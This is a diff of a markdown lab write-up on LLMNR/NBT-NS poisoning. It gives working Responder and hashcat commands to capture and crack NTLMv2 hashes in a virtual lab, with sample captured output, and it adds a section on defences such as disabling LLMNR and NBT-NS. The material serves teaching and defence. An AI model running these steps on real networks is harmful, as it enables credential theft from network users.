@@ -59,10 +59,14 @@ Victim                    Network                         Attacker
 
 ## Lab Setup
 ```
-| Machine |  OS        |      IP       |
-|---------|---------   |---------------|
-| Attacker| Kali Linux | 192.168.5.128 |
-| Victim  | Windows 10 | 192.168.5.135 |
+|   Component  |        Details                   |
+|--------------|----------------------------------|
+| Attacker     |       Kali Linux                 | 
+| Victim       |       Windows 10                 | 
+| Tool 1       |       Responder                  |
+| Tool 2       |       Hashcat                    |
+| Attacker IP  |       192.168.5.128              |
+| Victim IP    |       192.168.5.136              |
 ```
 Both machines on same VirtualBox Host-Only network.
 
@@ -88,7 +92,7 @@ eth0: 192.168.5.128
 sudo responder -I eth0 -dwv
 ```
 ```
-| Flag -----| Meaning---------- |
+|    Flag   |     Meaning       |
 |-----------|-------------------|
 | -I eth0   | Network interface |
 |    -d     | DHCP poisoning    |
@@ -102,7 +106,7 @@ Responder will now listen on the network and wait for someone to broadcast a nam
 
 On Windows victim, open File Explorer and type:
 ```
-\fakeshare
+\\fakeshare
 ```
 Windows tries DNS → fails → broadcasts LLMNR → Responder catches it.
 
@@ -110,24 +114,94 @@ Windows tries DNS → fails → broadcasts LLMNR → Responder catches it.
 ## In the attacker machine, the captured credentials will be displayed like this
 
 ```
-[SMB] NTLMv2-SSP Client   : 192.168.5.135
-[SMB] NTLMv2-SSP Username : READTEAMBD\rahimkhan
-[SMB] NTLMv2-SSP Hash     : rahimkhan::READTEAMBD:43afeed614f4F910:7D43CDB23265E5B3000072BABE6A6C54:0101000000000000804C7085A0330001000.... (full hash)...
+[SMB] NTLMv2-SSP Client   : fe80::1ba4:8be8:5787:2d63
+[SMB] NTLMv2-SSP Username : VICTIM-2\karim
+[SMB] NTLMv2-SSP Hash     : karim::VICTIM-2:9265e4bef71c4923:19C4EB1DD7F5B53D853808B81F0EBCE4:010100000000000000CFC35AC5E6DC0135AE1EB1E9966109000000000200080036005A .... (full hash)...
 ```
 ### Step 4 — Capture the Hash
 
 ```bash
-cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.5.135.txt > ~/hash.txt
+cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.5.136.txt > hash.txt
 ```
 
 ### Step 5 — Crack the Hash
 
 ```bash
-hashcat -m 5600 ~/hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
 Result:
+## Cracked Password
+
+```
+KARIM::VICTIM-2:08c4e1b5073681c1:7acce8f5708e0b1ea3bcbcf99f26fa01:101010000000000
+0003050242c6fd:01ea99382479946200308001004c0000000200040043004600310035003900300000000
+10004004600310035003900300000000300240043004600310035003900300001000000040000000500
+93003000300000000600040002000000070008000051d384c007d90100000000800304380000000c002
+0ba8403001095010095047805a003002ea80c4f04b38041804ac00700805506242c6fdc010600802000
+0000050006002000000000800045005300350033004a0083003300000000000000000000           
+                                                                        :Password1           
+```
+
+## Defense & Mitigation
+
+**Fix 1 — Disable LLMNR via Group Policy:**
+
+Computer Configuration
+→ Administrative Templates
+→ Network
+→ DNS Client
+→ Turn off Multicast Name Resolution
+→ Set to: ENABLED
+
+**Fix 2 — Disable NBT-NS:**
+
+Control Panel
+→ Network and Sharing Center
+→ Change Adapter Settings
+→ Right click → Properties
+→ IPv4 → Advanced
+→ WINS tab
+→ Select "Disable NetBIOS over TCP/IP"
+
+**Fix 3 — Enable Network Access Control (NAC):**
+
+Prevent unknown devices from joining the network.
+
+**Fix 4 — Use Strong Passwords:**
+
+Long complex passwords make hash cracking extremely difficult or impossible.
+<table>
+  <tr>
+    <th>Password</th>
+    <th>Crack Time</th>
+  </tr>
+  <tr>
+    <td>Password123</td>
+    <td>Few seconds</td>
+  </tr>
+  <tr>
+    <td>P@ssw0rd!</td>
+    <td>Few minutes</td>
+  </tr>
+  <tr>
+    <td>X#9kL$mQ2@vR</td>
+    <td>Years</td>
+  </tr>
+</table>
 
 
+## Key Takeaways
 
+- Works on most corporate networks — LLMNR is on by default
+- No special access needed — just be on the same network
+- Full attack takes less than 5 minutes
+- Turning off LLMNR and NBT-NS fully stops this attack
+
+
+## References
+
+- https://github.com/lgandx/Responder
+- TCM Security — Practical Ethical Hacking
+- MITRE ATT&CK T1557.001
 
